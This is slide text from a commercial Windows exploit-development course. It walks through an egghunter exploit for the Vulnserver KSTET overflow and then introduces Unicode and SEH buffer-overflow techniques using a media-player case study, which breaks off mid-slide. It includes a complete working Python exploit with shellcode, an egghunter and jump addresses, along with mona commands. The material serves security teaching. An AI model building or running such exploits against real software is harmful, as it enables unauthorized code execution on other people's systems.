• There are ~20 bytes for the shellcode after the EIP gets 
overwritten. After that, the payload gets truncated.
• There are 70 bytes for the shellcode before the EIP gets 
overwritten.
3.2.1 Vulnserver Debugging
|  p.30
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Even summarized, 90 bytes are not enough to store a more 
advanced payload (e.g. a reverse shell shellcode). Moreover, 
when taking into consideration that some bad characters will be 
discovered, we need at least a few hundred bytes available to 
place the shellcode. How can we do this?
If we manage to deliver another payload containing longer 
shellcode to the software’s memory, then we will be able to try 
using the egghunter shellcode. But how can we supply that data 
to the software’s memory?
3.2.1 Vulnserver Debugging
|  p.31
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
We can possibly try to establish another connection to 
vulnserver at the same time we send the exploit buffer. 
Since the egghunter shellcode is able to search the whole 
process memory, if another command can be stored in 
memory even for a short while, this could be enough for an 
egghunter shellcode to find it and execute it.
Let’s try adding an execution of another command to the 
exploit. Then, let’s issue the crashing command and try to 
find it in the program’s memory using mona.
3.2.1 Vulnserver Debugging
|  p.32
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The following block of code will be added before sending 
the crash.
3.2.1 Vulnserver Debugging
|  p.33
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The memory poisoning the buffer is designed in the same 
way the future shellcode would look like.
• The buffer starts with a suitable command, so its 
properly interpreted by the software. 
• Next is the marker, so when using the egghunter it can be 
found. 
• At the end is the shellcode placeholder – in this case 600 
letters “X”. 
3.2.1 Vulnserver Debugging
|  p.34
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
600 bytes are enough to store even large shellcode. Let’s 
give it a try and fire the updated exploit against the 
vulnserver.
3.2.1 Vulnserver Debugging
|  p.35
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
And let’s now simulate an egghunter at work using mona. In 
the ImmunityDbg console, issue the following command.
!mona find -type asc -s “w00t”
|  p.36
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Now, let’s right-click on 
the third pointer and 
choose “dump at 
address” from the drop-
down menu. 
It looks like the first 
shellcode was effectively 
stored in the memory. 
3.2.1 Vulnserver Debugging
|  p.37
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Let’s now try to examine the bad characters before we conclude 
this is a good place for shellcode execution. We can safely 
assume that the null byte is for sure a badchar. But what about 
the rest? For your ease, you can use the below ASCII table.
badchars = 
("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
|  p.38
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Let’s add all ASCII characters into the shellcode 
placeholder.
3.2.1 Vulnserver Debugging
|  p.39
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
After restarting vulnserver and launching the latest exploit, we will use 
mona again to find the “w00t” string. We can see it is populated in memory 
multiple times.
The egghunter will stop on first occurence of the „egg” and move the
execution flow there. We can also see that all ASCII byte values (0x1-0xff) 
were sent together with the buffer.
3.2.1 Vulnserver Debugging
|  p.40
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Perfect! It seems that there are no bad characters at all, as 
all ASCII bytes were stored in memory unchanged. We now 
have a safe place where we can store our main shellcode. 
Let’s go back to the first part of the buffer and try to 
implement the egghunter there.
Let’s restart the software and run the exploit once again. 
Thus far we know that there is enough space in the 
beginning of the buffer to fit an egghunter. There are also 
several bytes past EIP that can help us jump backwards.
3.2.1 Vulnserver Debugging
|  p.41
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Click HERE to go back to slide 55
Note: Now that we have concluded the bad characters task, 
let’s replace all “X”s on the exploit with “\xcc”s. Those 
breakpoints will help us identify if the egghunter has 
successfully discovered the larger part of our shellcode.
3.2.1 Vulnserver Debugging
|  p.42
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The theoretical flow will look like this:
• We’ll overwrite the EIP with the address of JMP ESP. This 
way, we’ll alter the control flow to the place of the stack 
that we are overwriting after EIP. Currently, B’s are there.
• Then, we’ll use those few bytes to jump backwards. That 
can be done by altering the stack or by a direct short 
jump. Currently, C’s are there.
• We’ll place the egghunter in the beginning of our buffer, 
so we can start executing it after the jump. Currently, A’s 
are there.
3.2.1 Vulnserver Debugging
|  p.43
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
3.2.1 Vulnserver Debugging
|  p.44
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Let’s start by finding the address of jmp esp.
!mona jmp –r ESP
|  p.45
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Let’s use the first one – 0x625011af and incorporate it to 
the exploit.
3.2.1 Vulnserver Debugging
|  p.46
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
After restarting and launching the exploit, we can see that 
we successfully moved the execution flow to the 
breakpoints.
3.2.1 Vulnserver Debugging
|  p.47
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
The next step will be to make a short jump backwards to 
the A’s. There are two possibilities:
• Decrease the ESP so it matches the start of the A’s, then 
jump to ESP.
• Perform a Short Jump (EB) backwards.
Let’s try a backward jump, as it has a smaller set of 
instructions. 
3.2.1 Vulnserver Debugging
|  p.48
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
For example, we could use:
\xEB\xCE – jump 50 bytes backwards
|  p.49
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
We have replaced the breakpoints with the backward jump 
instruction. 
Since we are about to place an egghunter in the very 
beginning of our buffer, let’s insert a placeholder for it. 
3.2.1 Vulnserver Debugging
|  p.50
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
In order to add reliability to the exploit, let’s change the 
initial buffer in the following way.
Which results in following.
[Vulnserver_COMMAND] [NOPS] [EGGHUNTER_PLACEHOLDER] 
[PAD_WITH_NOPS]
|  p.51
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
After launching the application and the latest exploit again, 
we reliably land at the very beginning of the A-buffer!
3.2.1 Vulnserver Debugging
|  p.52
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Perfect! So far, the exploit allowed us to land in the 
beginning of the egghunter placeholder. 
Let’s now make preparations to weaponize it.
3.2.1 Vulnserver Debugging
|  p.53
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
First, let’s implement a real egghunter instead of a 
placeholder.
Since we have an egghunter, let’s replace the shellcode 
placeholder with breakpoints. This way, we will know if the 
egghunter successfully reached it.
3.2.1 Vulnserver Debugging
|  p.54
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
After launching the application and the latest exploit again, we land at w00tw00t! 
The egghunter was executed and identified the larger part of our shellcode 
successfully. We remind you that the “X”s on the first part of the exploit were 
replaced with “\xcc”s, hence the screenshot below.
3.2.1 Vulnserver Debugging
|  p.55
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Everything works fine. Let’s then proceed to the final step. 
We need to add the shellcode instead of the breakpoints. 
We can use a msfvenom generated one – a simple calc will 
be enough to confirm code execution. 
3.2.1 Vulnserver Debugging
|  p.56
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
After pasting it into the exploit, let’s run the vulnserver 
normally (outside the debugger) and then fire the exploit 
against it.
msfvenom -p windows/exec CMD="calc.exe" 
EXITFUNC=thread -b "\x00" -f c
|  p.57
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
We should see calc.exe being executed!
3.2.1 Vulnserver Debugging
|  p.58
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
You can check out the full exploit code on the following 
slides.
3.2.1 Vulnserver Debugging
|  p.59
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
#!/usr/bin/python
import os, sys, socket
if len(sys.argv) != 3:
print "Usage: " + sys.argv[0] + " <Target IP> <Target Port>"
sys.exit(1)
ip = sys.argv[1]
port = int(sys.argv[2])
# msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f c
shellcode = ("\xdb\xc6\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x31\xba\x07\xeb\x8d"
"\xc5\x31\x57\x18\x03\x57\x18\x83\xef\xfb\x09\x78\x39\xeb\x4c"
"\x83\xc2\xeb\x30\x0d\x27\xda\x70\x69\x23\x4c\x41\xf9\x61\x60"
"\x2a\xaf\x91\xf3\x5e\x78\x95\xb4\xd5\x5e\x98\x45\x45\xa2\xbb"
"\xc5\x94\xf7\x1b\xf4\x56\x0a\x5d\x31\x8a\xe7\x0f\xea\xc0\x5a"
"\xa0\x9f\x9d\x66\x4b\xd3\x30\xef\xa8\xa3\x33\xde\x7e\xb8\x6d"
"\xc0\x81\x6d\x06\x49\x9a\x72\x23\x03\x11\x40\xdf\x92\xf3\x99"
"\x20\x38\x3a\x16\xd3\x40\x7a\x90\x0c\x37\x72\xe3\xb1\x40\x41"
"\x9e\x6d\xc4\x52\x38\xe5\x7e\xbf\xb9\x2a\x18\x34\xb5\x87\x6e"
"\x12\xd9\x16\xa2\x28\xe5\x93\x45\xff\x6c\xe7\x61\xdb\x35\xb3"
"\x08\x7a\x93\x12\x34\x9c\x7c\xca\x90\xd6\x90\x1f\xa9\xb4\xfe"
"\xde\x3f\xc3\x4c\xe0\x3f\xcc\xe0\x89\x0e\x47\x6f\xcd\x8e\x82"
"\xd4\x31\x6d\x07\x20\xda\x28\xc2\x89\x87\xca\x38\xcd\xb1\x48"
"\xc9\xad\x45\x50\xb8\xa8\x02\xd6\x50\xc0\x1b\xb3\x56\x77\x1b"
"\x96\x34\x16\x8f\x7a\x95\xbd\x37\x18\xe9")
|  p.60
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
#marker tag: w00t
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8w00t\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
buffer = "\x90"*20
buffer += egghunter
buffer += "\x90"*(70-len(buffer))
buffer += "\xAF\x11\x50\x62"    # jmp esp @ 0x625011AF
buffer += "\xEB\xCE"            # Jump back 50 bytes to give room for egghunter    
buffer += "C"*20
# Store the second shellcode in the memory
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
print s.recv(1024)
print "[+] Storing shellcode in target's memory"
s.send("STATS " + "w00tw00t" + shellcode)
print s.recv(1024)
s.close()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
print s.recv(1024)
print "[+] Sending buffer."
s.send("KSTET " + buffer)
print s.recv(1024)
s.close()
|  p.61
3.2.1 Vulnserver Debugging
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. There are several 
interesting videos and labs up 
next! 
|  p.62
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
This is a three-part video 
series, and in this first video, 
we are going to cover using 
the socket reuse shellcode 
in memory corruption 
exploits. 
Socket Reuse Shellcode -
Part 1
|  p.63
Video Part #1
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
In this video, we will 
continue our effort to build a 
socket-reuse based exploit. 
We will focus on examining 
the low-level internals of a 
socket and how it can be 
translated into shellcode.
Socket Reuse Shellcode -
Part 2
|  p.64
Video Part #2
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
In this video, we will 
finalize the socket reuse-
based exploit and launch 
it against the vulnserver.
Socket Reuse Shellcode -
Part 3
|  p.65
Video Part #3
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
using Egghunting shellcode 
to overcome buffer space 
limitations while trying to 
fully exploit a Windows 
stack overflow vulnerability.
Windows Egghunting 
(Kolibri HTTP Server)
|  p.66
Hera Lab #1
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your members area and 
click the labs drop-down in the appropriate module line or to the virtual labs tabs on the left navigation. To 
upgrade, click LINK. 
In this lab, you will practice 
identifying Windows stack overflow 
vulnerabilities through fuzzing. The 
fundamentals of fuzzing with Spike 
will be provided, and you will also be 
required to combine multiple 
exploitation techniques after an 
exploitable crash is identified.
Fuzzing Windows 
Software
|  p.67
Hera Lab #2
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
References
|  p.68
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
References
Safely Searching Process Virtual Address Space 
Vulnserver.zip
http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
https://sites.google.com/site/lupingreycorner/vulnserver.zip?attredirects=0
|  p.69
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Videos
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
Socket Reuse Shellcode - Part 1
This is a three-part video series, and in this first video, we are going to cover 
using the socket reuse shellcode in memory corruption exploits. 
Socket Reuse Shellcode - Part 2
In this video, we will continue our effort to build a socket-reuse based exploit. 
We will focus on examining the low-level internals of a socket and how it can be 
translated into shellcode.
|  p.70
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Videos
*Videos are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the resources drop-down in the appropriate module line. To upgrade, click 
LINK. 
Socket Reuse Shellcode - Part 3
In this video, we will finalize the socket reuse based exploit and launch it 
against the vulnserver.
|  p.71
XDSv1: Section 2, Module 3 - Caendra Inc. © 2019
Labs
*Labs are only available in Full or Elite Editions of the course. To access, go to the course in your 
members area and click the labs drop-down in the appropriate module line or to the virtual labs 
tabs on the left navigation. To upgrade, click LINK. 
Windows Egghunting (Kolibri HTTP Server)
In this lab, you will practice using Egghunting shellcode to overcome 
buffer space limitations while trying to fully exploit a Windows stack 
overflow vulnerability.
Fuzzing Windows Software
In this lab, you will practice identifying Windows stack overflow 
vulnerabilities through fuzzing. The fundamentals of fuzzing with Spike 
will be provided, and you will also be required to combine multiple 
exploitation techniques after an exploitable crash is identified.
|  p.72
© Caendra Inc. 2019
All Rights Reserved
Unicode Buffer Overflows
S e c t i o n  0 2  |  M o d u l e  0 4
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Table of Contents
MODULE 04 | UNICODE BUFFER OVERFLOWS
4.1 Character Transformation
4.2 Unicode Exploitation Case Study
|   p.2
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Learning Objectives
By the end of this module, you should have a better 
understanding of:
How to deal with unicode character transformation
during exploit development
How (and when) to utilize venetian shellcode
|   p.3
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
4.1
Character 
Transformation
|  p.4
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
When a buffer overflow vulnerability is abused in order to 
alter the EIP, the stack is being overwritten with the bytes 
that were sent to the software. When sending a buffer 
consisting of A’s that is long enough to cause the EIP to be 
overwritten, then the EIP becomes 0x41414141. 
This is because the software, when receiving an “A”, stores 
it in memory as its ASCII byte representation – 0x41. If the 
buffer consists of B’s ,the EIP will become 0x42424242 as 
B in ASCII representation is 0x42. 
4.1 Character Transformation
|  p.5
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
https://cdn.shopify.com/s/files/1/1014/5789/files/Standard-ASCII-Table_large.jpg?10669400161723642407
Here we see an ASCII 
table which contains the
byte represenation for
characters 0-0x7f.
4.1 Character Transformation
|  p.6
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Using any ASCII reference (ASCII table, ASCII decoder, etc.), 
you can get the information of what letter will cause the EIP 
or any other memory area to contain a certain byte 
sequence.
ASCII is a character set that contains 256 basic characters 
(0-256). One ASCII letter translates to exactly one byte of 
memory; thus, it is easy to place certain bytes in certain 
memory areas. What if the application uses another 
character set, like Unicode?
4.1 Character Transformation
|  p.7
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
In Unicode, unlike ASCII, each character occupies 2 bytes 
instead of one. This means, that when sending an ASCII 
character like “A”, it will get converted to its Unicode 
representation – 0x0041.
As you might have already guessed, this completely breaks 
our intentions to set a certain value of a register or memory 
location. 
4.1.1 Unicode Format
|  p.8
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
https://en.wikipedia.org/wiki/List_of_Unicode_characters
Here we can see part of 
the Unicode codes for 
the first half of the 
uppercase alphabet.
4.1.1 Unicode Format
|  p.9
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
It is not uncommon for applications to translate ASCII buffers 
into Unicode. Under the hood, this is just an application’s 
functionality to handle multilanguage character sets in order to 
improve user experience. 
This could also make exploitation harder though. As a result of 
such transformations, the application’s behavior may look as 
follows.
[User buffer “AAAA”] -> Stored in memory [“0x41414141”] -> 
Translation and copy to stack [“0x0041004100410041”] -> Stack 
overflow -> EIP / nSEH = 0x00410041
|  p.10
4.1.1 Unicode Format
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
All ASCII characters below 0x7F get 0’s appended while 
extending them to Unicode. Characters from 0x80 and 
above are translated into 2 bytes, and they might not 
include the original byte value. 
Additionally, some applications might work in an opposite 
way, adding the nulls in a different position after the  
transformation – so “AA” will become “0x41004100” 
instead of “0x00410041”. 
4.1.1 Unicode Format
|  p.11
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Unicode exploitation is very situational and requires 
adapting to the constraints that come up during the 
exploitation process. 
Luckily, there are some general methodologies that can 
help you in exploiting Unicode-translating applications.
4.1.1 Unicode Format
|  p.12
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Even if the EIP and the rest of the memory gets translated, 
the situation is not hopeless. There are possibilities, that:
• 0x00410041, or generally 0x00XX00YY, will be a valid 
address, and it will thus be possible to find an instruction 
that resides under it.
• The transformation is not 100% straightforward – not 
every single character is just getting two nulls. Some 
characters might get translated to a non-standard set of 
bytes. 
4.1.2 The Problem with Exploiting Unicode
|  p.13
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
• A non-translated copy of the payload is also present in 
the application’s memory – if you are lucky, it might even 
be possible to jump to it.
• Venetian shellcode (more on it soon) might help you to 
align your stack layout so it will be easier to execute 
something meaningful.
• Shellcode encoders (this will also be explained soon) can 
help you make your shellcode Unicode-friendly so it will 
not get corrupted by translation mechanisms.
4.1.2 The Problem with Exploiting Unicode
|  p.14
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
When attempting to place the shellcode, it can also get 
translated. That means, the shellcode will become unusable
as the unicode translation will insert null bytes into it.
However, a way around it is to encode the shellcode in a 
way that it will be Unicode compatible. 
4.1.2 The Problem with Exploiting Unicode
|  p.15
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
https://github.com/SkyLined/alpha3
One of the tools that can help you achieve shellcode 
Unicode compatibility is SkyLined’s alpha encoder. 
According to its documentation:
The decoder will change its own code to escape the limitations of alphanumeric code. It 
creates a decoder loop that will decode the original shellcode from the encoded data. It 
overwrites the encoded data with the decoded shellcode and transfers execution to it when 
done. To do this, it needs read, write and execute permission on the memory it’s running in 
and it needs to know its location in memory (it’s baseaddress).
4.1.2 The Problem with Exploiting Unicode
|  p.16
“
“
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
So basically, what the alpha encoder does is:
• Creates a shellcode that is workable after being 
converted to Unicode (the shellcode won’t work if there 
is no transformation in place).
• Pushes into memory certain byte values, filling it with a 
real shellcode byte by byte.
• In the end, jumps to its beginning.
How’s that possible?
4.1.2 The Problem with Exploiting Unicode
|  p.17
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The fact that (almost) every single byte is null doesn’t mean
that we cannot execute code. It only means that our 
capabilities are limited. 
In the early 2000’s, researchers discovered a set of 
instructions that can be used despite the presence of zeros. 
4.1.3 Venetian Shellcode
|  p.18
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The shellcode based on such an instruction set was named 
“Venetian shellcode”. For example, here we can see the 
opcode notation of the following instructions.
|40                inc eax ; increase eax
|004500        add [ebp+0x0],al ; add from eax to data at an unused location. This
is basically an equivalent of nop.
|40                inc eax ; increase eax
|004500        add [ebp+0x0],al  ; again we neutralized zeros by using them as a
nop-like instruction to modify data at an unused location
|C60058       mov byte [eax],0x58; move some data to eax
|  p.19
4.1.3 Venetian Shellcode
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
If the previous slide seems complicated, there are two great 
resources that explain in detail the concept of such 
shellcodes and also contain a full reference of the allowed 
instructions:
•
http://phrack.org/issues/61/11.html#article
•
https://www.blackhat.com/presentations/win-usa-04/bh-win-04-fx.pdf
4.1.3 Venetian Shellcode
|  p.20
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
In the case of SEH exploitation, which is common in the Windows 
world, we usually rely on overwriting the SEH pointer with a 
pointer to a POP-POP-RET gadget, and then set the nSEH to jump 
through the current SEH pointer. What about Unicode?
Unfortunately we will not be able to perform the familiar jump EB 
06, as such an instruction is non-compatible with the unicode 
character set. However, the reason why we do that jump is 
because SEH contains an address that cannot be used as an 
instruction. What if the SEH contained an address that can be 
used as a nop-like instruction at the same time?
4.1.4 Unicode and SEH
|  p.21
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
A Unicode-friendly address (0x00XX00YY) might end up to 
be a NOP-like instruction, like in the aforementioned
assembly code.
4.1.4 Unicode and SEH
|  p.22
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
So, a potential SEH holding an address of 0x00450040 
might be executed as regular instructions. If under the 
0x00450040 address there’s a POP-POP-RET instruction, 
it’s a win.
|004500            add [ebp+0x0],al                              
|40                
inc eax 
|  p.23
4.1.4 Unicode and SEH
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Exploitation schema
So, to summarize, the general exploitation strategy for 
Unicode buffer overflows is to:
• Overwrite the EIP as usual.
• Find the way to return to the stack using a Unicode-
friendly address in memory (like JMP ESP).
4.1.5 Unicode Exploitation Strategy
|  p.24
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
•
Or, overwrite SEH with a Unicode-friendly address and then 
find a Unicode compatible address to POP POP RET.
•
If none of the registers contains a reference to the user-
supplied buffer at the moment of the crash, venetian shellcode 
can be used to adjust the value of a register and then jump to 
the user payload using that register as reference (jmp reg)
•
For code execution, use alphanumeric-encoded shellcode.
Let’s check out a practical example.
4.1.5 Unicode Exploitation Strategy
|  p.25
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
4.2
Unicode Exploitation 
Case Study
|  p.26
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Let’s study an example of Unicode buffer overflow 
exploitation against the Triologic Media Player 8.
A similar walkthrough was also presented in 
FuzzySecurity’s article below:
https://www.fuzzysecurity.com/tutorials/expDev/5.html
4.2 Unicode Exploitation Case Study
|  p.27
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The software is vulnerable to a buffer overflow when 
loading a crafted playlist (.m3u) file. When long enough, the 
file will cause the software to overflow its stack.
On the other hand, the data is transformed to Unicode, 
which is an additional challenge when developing an 
exploit. 
4.2 Unicode Exploitation Case Study
|  p.28
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Click HERE to go back to slide 31
We will start with a script that generates a malicious .m3u 
file. Every restart of the exploit will consist of the following 
actions:
• Appropriate modification of the exploit script based on 
the respective step.
• Generation of a new m3u file.
• Re-opening the software.
• Attaching the debugger to the software and run it.
• Load playlist from file, using the latest m3u exploit file.
4.2 Unicode Exploitation Case Study
|  p.29
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Here is the starting script.
4.2 Unicode Exploitation Case Study
|  p.30
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
According to the list on slide 29, let’s first generate a 
crafted playlist (use the snippet on the previous slide to do 
so). Then, let’s attach the debugger to the Triologic player, 
as follows.
4.2 Unicode Exploitation Case Study
|  p.31
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Now, let’s open the 
exploit file.
4.2 Unicode Exploitation Case Study
|  p.32
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The software answers with an exception. Let’s pass it to the 
software (Shift + F9).
4.2 Unicode Exploitation Case Study
|  p.33
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
EIP became 0x00410041. This mean that we can overwrite 
the EIP after an exception occurs. Let’s now confirm that 
the exception handler structure was overwritten by scrolling 
down the stack.
4.2 Unicode Exploitation Case Study
|  p.34
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Indeed it is an SEH-based Unicode overflow. Let’s try to 
figure out the offset to the SEH structure in order to 
overwrite the EIP in a predictable manner.
4.2 Unicode Exploitation Case Study
|  p.35
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
After providing the application with the latest .m3u file (that 
was generated from a modified version of the exploit script 
that contained the pattern), let’s stop when the exception 
handler kicks in (do not pass the exception to the program).
Let’s view the SEH chain now.
4.2 Unicode Exploitation Case Study
|  p.36
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Calculating the offset to the EIP in Unicode exploits is more 
difficult, or, at least more tedious.
In this case, we can try to utilize the information that was 
used to overwrite the SEH structure in order to infer the 
proper payload length.
4.2 Unicode Exploitation Case Study
|  p.37
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Since the payload gets split up with zeros, we need two 
subsequent addresses to get the 4-byte pattern fragment that 
can be passed back to the pattern_offset utility.
In this case, we can find the needed addresses from the SEH 
structure. We should take the zeros out of these two addresses 
and provide them to the pattern offset utility, as follows.
4.2 Unicode Exploitation Case Study
|  p.38
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The pattern was found on position 536, which means that 
after that buffer length we will start to overwrite the SEH 
structure.
Unlike regular SEH, we do not subtract anything from it as 
we are counting from the beginning of the SEH structure –
we took the 8 bytes from it.
4.2 Unicode Exploitation Case Study
|  p.39
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Let’s modify the exploit accordingly.
4.2 Unicode Exploitation Case Study
|  p.40
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Now, we’ll provide the latest .m3u exploit file that was 
generated to the application. Before passing the exception 
to the program, let’s look at the SEH chain. Our offset 
calculations were correct!
4.2 Unicode Exploitation Case Study
|  p.41
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
As we confirmed the proper offset to overwrite, let’s pass 
the exception to the program.
4.2 Unicode Exploitation Case Study
|  p.42
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
The EIP is different. This is because 0x00430043 is a valid 
address in the application, and the program managed to execute
a few instructions more than we planned. After executing some
instructions (currently it is not important, what instructions were 
those exactly), the program finally encountered an instruction 
that relied on some data that was changed due to the overflow. 
This fact that caused the program to crash.
Right now, we can ignore this fact, as our purpose was to confirm 
the offset to overwrite the SEH. 
4.2 Unicode Exploitation Case Study
|  p.43
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
Let’s now focus on transferring the execution flow to the 
stack.
SEH-based exploitation during Unicode stack overflows is 
almost the same as in regular buffer overflows; however, 
we need to remember that we cannot use “\xEB\x06” to 
jump over SEH as it is not a Unicode-compatible 
instruction. 
4.2 Unicode Exploitation Case Study
|  p.44
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
However, other instructions can be used in order to achieve 
a similar effect.
Let’s find try to locate the available POP/POP/RET gadgets, 
as follows.
!mona seh -cp unicode
|  p.45
4.2 Unicode Exploitation Case Study
XDSv1: Section 2, Module 4 - Caendra Inc. © 2019
After experimenting with certain instructions, only one 
seems to work properly when walked by from the nSEH, and 
